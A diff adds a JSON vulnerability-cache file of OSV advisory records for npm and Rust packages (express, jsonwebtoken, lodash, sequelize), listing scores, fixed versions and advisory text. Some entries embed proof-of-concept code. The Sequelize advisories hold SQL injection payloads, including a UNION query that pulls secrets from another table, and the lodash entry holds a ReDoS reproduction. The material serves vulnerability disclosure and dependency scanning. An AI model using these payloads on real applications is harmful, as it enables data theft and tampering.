+    "published": "2021-01-08T12:00:00Z",
+    "severity": "Critical",
+    "source": "RustSec",
+    "summary": "Buffer overflow in SmallVec::insert_many",
+    "url": "https://osv.dev/vulnerability/RUSTSEC-2021-0003"
+   }
+  ],
+  "npm|express|4.17.1": [
+   {
+    "advisory_id": "GHSA-qw6h-vgh9-j6wx",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2024-43796"
+    ],
+    "cve": "CVE-2024-43796",
+    "cvss": 5.0,
+    "cvss_alternate_assessments": [
+     {
+      "score": 5.0,
+      "source": "advisory severity[].score",
+      "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
+      "version": "3.1"
+     }
+    ],
+    "cvss_preferred_score": 2.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:L",
+    "cvss_version": "4.0",
+    "details": "### Impact\n\nIn express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in express 4.20.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
+    "fixed_versions": [
+     "4.20.0",
+     "5.0.0"
+    ],
+    "id": "GHSA-qw6h-vgh9-j6wx",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:18.298562940Z",
+    "provider": "OSV",
+    "published": "2024-09-10T19:41:04Z",
+    "severity": "Low",
+    "source": "GitHub",
+    "summary": "express vulnerable to XSS via response.redirect()",
+    "url": "https://osv.dev/vulnerability/GHSA-qw6h-vgh9-j6wx"
+   },
+   {
+    "advisory_id": "GHSA-rv95-896h-c2vc",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2024-29041"
+    ],
+    "cve": "CVE-2024-29041",
+    "cvss": 6.1,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "### Impact\n\nVersions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs.\n\nWhen a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https://github.com/pillarjs/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`.\n\n### Patches\n\nhttps://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd\nhttps://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94\n\nAn initial fix went out with `express@4.19.0`, we then patched a feature regression in `4.19.1` and added improved handling for the bypass in `4.19.2`.\n\n### Workarounds\n\nThe fix for this involves pre-parsing the url string with either `require('node:url').parse` or `new URL`. These are steps you can take on your own before passing the user input string to `res.location` or `res.redirect`.\n\n### Resources\n\nhttps://github.com/expressjs/express/pull/5539\nhttps://github.com/koajs/koa/issues/1800\nhttps://expressjs.com/en/4x/api.html#res.location",
+    "fixed_versions": [
+     "4.19.2",
+     "5.0.0-beta.3"
+    ],
+    "id": "GHSA-rv95-896h-c2vc",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:10.750068508Z",
+    "provider": "OSV",
+    "published": "2024-03-25T19:40:26Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Express.js Open Redirect in malformed URLs",
+    "url": "https://osv.dev/vulnerability/GHSA-rv95-896h-c2vc"
+   }
+  ],
+  "npm|jsonwebtoken|0.4.0": [
+   {
+    "advisory_id": "GHSA-8cf7-32gw-wr33",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2022-23539"
+    ],
+    "cve": "CVE-2022-23539",
+    "cvss": 8.1,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "cvss_version": "3.1",
+    "details": "# Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library could be misconfigured so that legacy, insecure key types are used for signature verification. For example, DSA keys could be used with the RS256 algorithm. \n\n# Am I affected?\n\nYou are affected if you are using an algorithm and a key type other than the combinations mentioned below\n\n| Key type |  algorithm                                    |\n|----------|------------------------------------------|\n| ec           | ES256, ES384, ES512                      |\n| rsa          | RS256, RS384, RS512, PS256, PS384, PS512 |\n| rsa-pss  | PS256, PS384, PS512                      |\n\nAnd for Elliptic Curve algorithms:\n\n| `alg` | Curve      |\n|-------|------------|\n| ES256 | prime256v1 |\n| ES384 | secp384r1  |\n| ES512 | secp521r1  |\n\n# How do I fix it?\n\nUpdate to version 9.0.0. This version validates for asymmetric key type and algorithm combinations. Please refer to the above mentioned algorithm / key type combinations for the valid secure configuration. After updating to version 9.0.0, If you still intend to continue with signing or verifying tokens using invalid key type/algorithm value combinations, you\u2019ll need to set the `allowInvalidAsymmetricKeyTypes` option to `true` in the `sign()` and/or `verify()` functions.\n\n# Will the fix impact my users?\n\nThere will be no impact, if you update to version 9.0.0 and you already use a valid secure combination of key type and algorithm. Otherwise,  use the  `allowInvalidAsymmetricKeyTypes` option  to `true` in the `sign()` and `verify()` functions to continue usage of invalid key type/algorithm combination in 9.0.0 for legacy compatibility. \n\n",
+    "fixed_versions": [
+     "9.0.0"
+    ],
+    "id": "GHSA-8cf7-32gw-wr33",
+    "matching_method": "exact_package_version_query",
+    "modified": "2024-06-24T21:23:38Z",
+    "provider": "OSV",
+    "published": "2022-12-22T03:32:22Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "jsonwebtoken unrestricted key type could lead to legacy keys usage ",
+    "url": "https://osv.dev/vulnerability/GHSA-8cf7-32gw-wr33"
+   },
+   {
+    "advisory_id": "GHSA-c7hr-j4mj-j2w6",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2015-9235"
+    ],
+    "cve": "CVE-2015-9235",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": null,
+    "cvss_vector": null,
+    "cvss_version": null,
+    "details": "Versions 4.2.1 and earlier of `jsonwebtoken` are affected by a verification bypass vulnerability. This is a result of weak validation of the JWT algorithm type, occuring when an attacker is allowed to arbitrarily specify the JWT algorithm.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.2.2 or later.",
+    "fixed_versions": [
+     "4.2.2"
+    ],
+    "id": "GHSA-c7hr-j4mj-j2w6",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:48:15.346337398Z",
+    "provider": "OSV",
+    "published": "2018-10-09T00:38:30Z",
+    "severity": "Critical",
+    "source": "GitHub",
+    "summary": "Verification Bypass in jsonwebtoken",
+    "url": "https://osv.dev/vulnerability/GHSA-c7hr-j4mj-j2w6"
+   },
+   {
+    "advisory_id": "GHSA-hjrf-2m68-5959",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2022-23541"
+    ],
+    "cve": "CVE-2022-23541",
+    "cvss": 5.0,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L",
+    "cvss_version": "3.1",
+    "details": "# Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library can be misconfigured so that passing a poorly implemented key retrieval function (referring to the `secretOrPublicKey` argument from the [readme link](https://github.com/auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) will result in incorrect verification of tokens. There is a possibility of using a different algorithm and key combination in verification  than the one that was used to sign the tokens. Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of forged tokens. \n\n# Am I affected?\n\nYou will be affected if your application is supporting usage of both symmetric key and asymmetric key in jwt.verify() implementation with the same key retrieval function. \n\n# How do I fix it?\n \nUpdate to version 9.0.0.\n\n# Will the fix impact my users?\n\nThere is no impact for end users",
+    "fixed_versions": [
+     "9.0.0"
+    ],
+    "id": "GHSA-hjrf-2m68-5959",
+    "matching_method": "exact_package_version_query",
+    "modified": "2024-06-24T21:24:06Z",
+    "provider": "OSV",
+    "published": "2022-12-22T03:33:19Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "jsonwebtoken's insecure implementation of key retrieval function could lead to Forgeable Public/Private Tokens from RSA to HMAC",
+    "url": "https://osv.dev/vulnerability/GHSA-hjrf-2m68-5959"
+   },
+   {
+    "advisory_id": "GHSA-qwph-4952-7xr6",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2022-23540"
+    ],
+    "cve": "CVE-2022-23540",
+    "cvss": 6.4,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L",
+    "cvss_version": "3.1",
+    "details": "# Overview\n\nIn versions <=8.5.1 of jsonwebtoken library, lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification.\n\n# Am I affected?\nYou will be affected if all the following are true in the `jwt.verify()` function:\n- a token with no signature is received\n- no algorithms are specified \n- a falsy (e.g. null, false, undefined) secret or key is passed \n\n# How do I fix it?\n \nUpdate to version 9.0.0 which removes the default support for the none algorithm in the `jwt.verify()` method. \n\n# Will the fix impact my users?\n\nThere will be no impact, if you update to version 9.0.0 and you don\u2019t need to allow for the `none` algorithm. If you need 'none' algorithm, you have to explicitly specify that in `jwt.verify()` options.",
+    "fixed_versions": [
+     "9.0.0"
+    ],
+    "id": "GHSA-qwph-4952-7xr6",
+    "matching_method": "exact_package_version_query",
+    "modified": "2025-02-13T18:33:13Z",
+    "provider": "OSV",
+    "published": "2022-12-22T03:32:59Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "jsonwebtoken vulnerable to signature validation bypass due to insecure default algorithm in jwt.verify()",
+    "url": "https://osv.dev/vulnerability/GHSA-qwph-4952-7xr6"
+   }
+  ],
+  "npm|lodash|4.17.15": [
+   {
+    "advisory_id": "GHSA-29mw-wpgm-hmr9",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2020-28500"
+    ],
+    "cve": "CVE-2020-28500",
+    "cvss": 5.3,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "cvss_version": "3.1",
+    "details": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require('lodash');\n\nfunction build_blank(n) {\n    var ret = \"1\"\n    for (var i = 0; i < n; i++) {\n        ret += \" \"\n    }\n    return ret + \"1\";\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) \nvar time_cost0 = Date.now() - time0;\nconsole.log(\"time_cost0: \" + time_cost0);\nvar time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\"time_cost1: \" + time_cost1);\nvar time2 = Date.now();\nlo.trimEnd(s);\nvar time_cost2 = Date.now() - time2;\nconsole.log(\"time_cost2: \" + time_cost2);\n```",
+    "fixed_versions": [
+     "4.17.21"
+    ],
+    "id": "GHSA-29mw-wpgm-hmr9",
+    "matching_method": "exact_package_version_query",
+    "modified": "2025-09-29T21:12:31.102523Z",
+    "provider": "OSV",
+    "published": "2022-01-06T20:30:46Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Regular Expression Denial of Service (ReDoS) in lodash",
+    "url": "https://osv.dev/vulnerability/GHSA-29mw-wpgm-hmr9"
+   },
+   {
+    "advisory_id": "GHSA-35jh-r3h4-6jhm",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2021-23337"
+    ],
+    "cve": "CVE-2021-23337",
+    "cvss": 7.2,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 7.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_version": "3.1",
+    "details": "`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.",
+    "fixed_versions": [
+     "4.17.21"
+    ],
+    "id": "GHSA-35jh-r3h4-6jhm",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-10-17T02:55:38.085813876Z",
+    "provider": "OSV",
+    "published": "2021-05-06T16:05:51Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "Command Injection in lodash",
+    "url": "https://osv.dev/vulnerability/GHSA-35jh-r3h4-6jhm"
+   },
+   {
+    "advisory_id": "GHSA-f23m-r3pf-42rh",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-2950"
+    ],
+    "cve": "CVE-2026-2950",
+    "cvss": 6.5,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+    "cvss_version": "3.1",
+    "details": "### Impact\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\n### Patches\n\nThis issue is patched in 4.18.0.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+    "fixed_versions": [
+     "4.18.0"
+    ],
+    "id": "GHSA-f23m-r3pf-42rh",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-10-17T02:56:13.084362346Z",
+    "provider": "OSV",
+    "published": "2026-04-01T23:50:27Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`",
+    "url": "https://osv.dev/vulnerability/GHSA-f23m-r3pf-42rh"
+   },
+   {
+    "advisory_id": "GHSA-p6mc-m468-83gw",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2020-8203"
+    ],
+    "cve": "CVE-2020-8203",
+    "cvss": 7.4,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 7.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H",
+    "cvss_version": "3.1",
+    "details": "Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The functions `pick`, `set`, `setWith`, `update`, `updateWith`, and `zipObjectDeep` allow a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires manipulating objects based on user-provided property values or arrays.\n\nThis vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.",
+    "fixed_versions": [
+     "4.17.19",
+     "4.17.20"
+    ],
+    "id": "GHSA-p6mc-m468-83gw",
+    "matching_method": "exact_package_version_query",
+    "modified": "2025-08-12T21:56:17.174859Z",
+    "provider": "OSV",
+    "published": "2020-07-15T19:15:48Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "Prototype Pollution in lodash",
+    "url": "https://osv.dev/vulnerability/GHSA-p6mc-m468-83gw"
+   },
+   {
+    "advisory_id": "GHSA-r5fr-rjxr-66jc",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-4800"
+    ],
+    "cve": "CVE-2026-4800",
+    "cvss": 8.1,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_version": "3.1",
+    "details": "### Impact\n\nThe fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",
+    "fixed_versions": [
+     "4.18.0"
+    ],
+    "id": "GHSA-r5fr-rjxr-66jc",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-10-17T02:56:15.633068434Z",
+    "provider": "OSV",
+    "published": "2026-04-01T23:51:12Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "lodash vulnerable to Code Injection via `_.template` imports key names",
+    "url": "https://osv.dev/vulnerability/GHSA-r5fr-rjxr-66jc"
+   },
+   {
+    "advisory_id": "GHSA-xxjr-mmjv-4gpg",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2025-13465"
+    ],
+    "cve": "CVE-2025-13465",
+    "cvss": 6.5,
+    "cvss_alternate_assessments": [
+     {
+      "score": 6.5,
+      "source": "advisory severity[].score",
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+      "version": "3.1"
+     }
+    ],
+    "cvss_preferred_score": 6.9,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:H/SI:H/SA:H/E:P",
+    "cvss_version": "4.0",
+    "details": "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
+    "fixed_versions": [
+     "4.17.23"
+    ],
+    "id": "GHSA-xxjr-mmjv-4gpg",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-10-17T02:55:54.229635593Z",
+    "provider": "OSV",
+    "published": "2026-01-21T23:01:22Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions",
+    "url": "https://osv.dev/vulnerability/GHSA-xxjr-mmjv-4gpg"
+   }
+  ],
+  "npm|sequelize|6.37.3": [
+   {
+    "advisory_id": "GHSA-6457-6jrx-69cr",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-30951"
+    ],
+    "cve": "CVE-2026-30951",
+    "cvss": 7.5,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_version": "3.1",
+    "details": "### Summary\n\nSQL injection via unescaped cast type in JSON/JSONB `where` clause processing. The `_traverseJSON()` function splits JSON path keys on `::` to extract a cast type, which is interpolated raw into `CAST(... AS <type>)` SQL. An attacker who controls JSON object keys can inject arbitrary SQL and exfiltrate data from any table.\n\nAffected: v6.x through 6.37.7. v7 (`@sequelize/core`) is not affected.\n\n### Details\n\nIn `src/dialects/abstract/query-generator.js`, `_traverseJSON()` extracts a cast type from `::` in JSON keys without validation:\n\n```javascript\n// line 1892\n_traverseJSON(items, baseKey, prop, item, path) {\n    let cast;\n    if (path[path.length - 1].includes(\"::\")) {\n      const tmp = path[path.length - 1].split(\"::\");\n      cast = tmp[1];       // attacker-controlled, no escaping\n      path[path.length - 1] = tmp[0];\n    }\n    // ...\n    items.push(this.whereItemQuery(this._castKey(pathKey, item, cast), { [Op.eq]: item }));\n}\n```\n\n`_castKey()` (line 1925) passes it to `Utils.Cast`, and `handleSequelizeMethod()` (line 1692) interpolates it directly:\n\n```javascript\nreturn `CAST(${result} AS ${smth.type.toUpperCase()})`;\n```\n\nJSON path **values** are escaped via `this.escape()` in `jsonPathExtractionQuery()`, but the cast **type** is not.\n\n**Suggested fix** \u2014 whitelist known SQL data types:\n\n```javascript\nconst ALLOWED_CAST_TYPES = new Set([\n  'integer', 'text', 'real', 'numeric', 'boolean', 'date',\n  'timestamp', 'timestamptz', 'json', 'jsonb', 'float',\n  'double precision', 'bigint', 'smallint', 'varchar', 'char',\n]);\n\nif (cast && !ALLOWED_CAST_TYPES.has(cast.toLowerCase())) {\n  throw new Error(`Invalid cast type: ${cast}`);\n}\n```\n\n### PoC\n\n`npm install sequelize@6.37.7 sqlite3`\n\n```javascript\nconst { Sequelize, DataTypes } = require('sequelize');\n\nasync function main() {\n  const sequelize = new Sequelize('sqlite::memory:', { logging: false });\n\n  const User = sequelize.define('User', {\n    username: DataTypes.STRING,\n    metadata: DataTypes.JSON,\n  });\n\n  const Secret = sequelize.define('Secret', {\n    key: DataTypes.STRING,\n    value: DataTypes.STRING,\n  });\n\n  await sequelize.sync({ force: true });\n\n  await User.bulkCreate([\n    { username: 'alice', metadata: { role: 'admin', level: 10 } },\n    { username: 'bob',   metadata: { role: 'user',  level: 5 } },\n    { username: 'charlie', metadata: { role: 'user', level: 1 } },\n  ]);\n\n  await Secret.bulkCreate([\n    { key: 'api_key', value: 'sk-secret-12345' },\n    { key: 'db_password', value: 'super_secret_password' },\n  ]);\n\n  // TEST 1: WHERE clause bypass\n  const r1 = await User.findAll({\n    where: { metadata: { 'role::text) or 1=1--': 'anything' } },\n    logging: (sql) => console.log('SQL:', sql),\n  });\n  console.log('OR 1=1:', r1.map(u => u.username));\n  // Returns ALL rows: ['alice', 'bob', 'charlie']\n\n  // TEST 2: UNION-based cross-table exfiltration\n  const r2 = await User.findAll({\n    where: {\n      metadata: {\n        'role::text) and 0 union select id,key,value,null,null from Secrets--': 'x'\n      }\n    },\n    raw: true,\n    logging: (sql) => console.log('SQL:', sql),\n  });\n  console.log('UNION:', r2.map(r => `${r.username}=${r.metadata}`));\n  // Returns: api_key=sk-secret-12345, db_password=super_secret_password\n}\n\nmain().catch(console.error);\n```\n\n**Output:**\n\n```\nSQL: SELECT `id`, `username`, `metadata`, `createdAt`, `updatedAt`\n  FROM `Users` AS `User`\n  WHERE CAST(json_extract(`User`.`metadata`,'$.role') AS TEXT) OR 1=1--) = 'anything';\nOR 1=1: [ 'alice', 'bob', 'charlie' ]\n\nSQL: SELECT `id`, `username`, `metadata`, `createdAt`, `updatedAt`\n  FROM `Users` AS `User`\n  WHERE CAST(json_extract(`User`.`metadata`,'$.role') AS TEXT) AND 0\n  UNION SELECT ID,KEY,VALUE,NULL,NULL FROM SECRETS--) = 'x';\nUNION: [ 'api_key=sk-secret-12345', 'db_password=super_secret_password' ]\n```\n\n### Impact\n\n**SQL Injection (CWE-89)** \u2014 Any application that passes user-controlled objects as `where` clause values for JSON/JSONB columns is vulnerable. An attacker can exfiltrate data from any table in the database via UNION-based or boolean-blind injection. All dialects with JSON support are affected (SQLite, PostgreSQL, MySQL, MariaDB).\n\nA common vulnerable pattern:\n\n```javascript\napp.post('/api/users/search', async (req, res) => {\n  const users = await User.findAll({\n    where: { metadata: req.body.filter }  // user controls JSON object keys\n  });\n  res.json(users);\n});\n```",
+    "fixed_versions": [
+     "6.37.8"
+    ],
+    "id": "GHSA-6457-6jrx-69cr",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:37.694732367Z",
+    "provider": "OSV",
+    "published": "2026-03-11T00:18:48Z",
+    "severity": "High",
+    "source": "GitHub",
+    "summary": "Sequelize v6 Vulnerable to SQL Injection via JSON Column Cast Type",
+    "url": "https://osv.dev/vulnerability/GHSA-6457-6jrx-69cr"
+   },
+   {
+    "advisory_id": "GHSA-v8fg-2rw7-q452",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-69240"
+    ],
+    "cve": "CVE-2026-69240",
+    "cvss": 9.8,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_version": "3.1",
+    "details": "### Summary\nSQL Injection is possible with strings only **if dialect is set to `oracle`**.\nThe vulnerability was confirmed on Sequelize v6.37.3.\n\n### Details\nThe `escape` function defined in `sql-string.js` does not escape quotes if the value starts with `TO_TIMESTAMP` or `TO_DATE`.\n\n```javascript\n  } else if (dialect === 'oracle' && typeof val === 'string') {\n    if (val.startsWith('TO_TIMESTAMP') || val.startsWith('TO_DATE')) {\n      return val;\n    }\n    val = val.replace(/'/g, \"''\");\n  }\n```\n\n### PoC\nSuppose the application has the following code:\n\n```javascript\n  var result = await models.Student.findOne({\n    where: {\n      firstName: req.query.firstName\n    }\n  });\n```\n\nAn attacker can inject arbitrary sql expressions.\n\n`http://host/path?firstName=TO_DATE('0','Y')||'' OR 1=1--`\n\nThe resulted SQL will be:\n\n```SQL\nSELECT ... WHERE \"Student\".\"firstName\" = TO_DATE('0','Y')||'' OR 1=1-- ORDER BY \"Student\".\"id\" OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;\n```\n\n### Impact\nData theft and tampering.",
+    "fixed_versions": [
+     "6.37.4"
+    ],
+    "id": "GHSA-v8fg-2rw7-q452",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-08-03T20:56:43.986253Z",
+    "provider": "OSV",
+    "published": "2026-08-03T20:29:50Z",
+    "severity": "Critical",
+    "source": "GitHub",
+    "summary": "Sequelize: SQL Injection (Oracle DB)",
+    "url": "https://osv.dev/vulnerability/GHSA-v8fg-2rw7-q452"
+   }
+  ]
+ },
+ "fetched": {},
+ "schema": "rsecopsx.vuln_cache_pinned/v1",
+ "source": "extracted from data/.vuln_cache.json by tools/emit_corpus_manifest.py"
+}
